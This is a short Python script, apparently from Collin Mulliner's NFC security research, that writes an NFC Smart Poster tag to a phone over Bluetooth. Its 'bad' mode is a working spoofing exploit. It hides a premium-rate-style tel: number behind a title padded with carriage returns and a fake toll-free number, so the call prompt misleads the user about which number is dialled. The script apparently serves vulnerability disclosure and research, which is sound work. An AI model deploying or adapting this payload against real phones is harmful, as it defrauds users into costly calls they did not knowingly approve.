#!/usr/bin/python

#
# Copyright: Collin Mulliner <collin@mulliner.org>
# Web: http://www.mulliner.org/nfc/
#
# License: GPLv2
#

import NDEFSmartPoster
import NDEFUri
import NDEFTextRecord
import NDEFMessage
import CollinsBtNfcAdapter
import os

if len(os.sys.argv) < 2:
	print "need to provide Bluetooth address of phone running BtNfcAdapter.jar"
	print " pass option \"good\" to generate a the good tag for comparision"
	print "syntax: " + os.sys.argv[0] + " <BDADDR> [good]"
else:
	sp = NDEFSmartPoster.NDEFSmartPoster()
	
	sp.setUri("tel:0900942234711")
	
	if len(os.sys.argv) == 3:
		# good
		sp.setTitle("Tourist Information")
	else:
		# bad
		sp.setTitle("Tourist Information\r080055598127634\r\r\r\r\r\r\r\r.")
	
	#print sp.getNDEFMessage().getHex()

	baddr = os.sys.argv[1]
	chan = 25
	na = CollinsBtNfcAdapter.CollinsBtNfcAdapter()
	na.quickWrite(sp.getNDEFMessage().getHex(), baddr, chan)
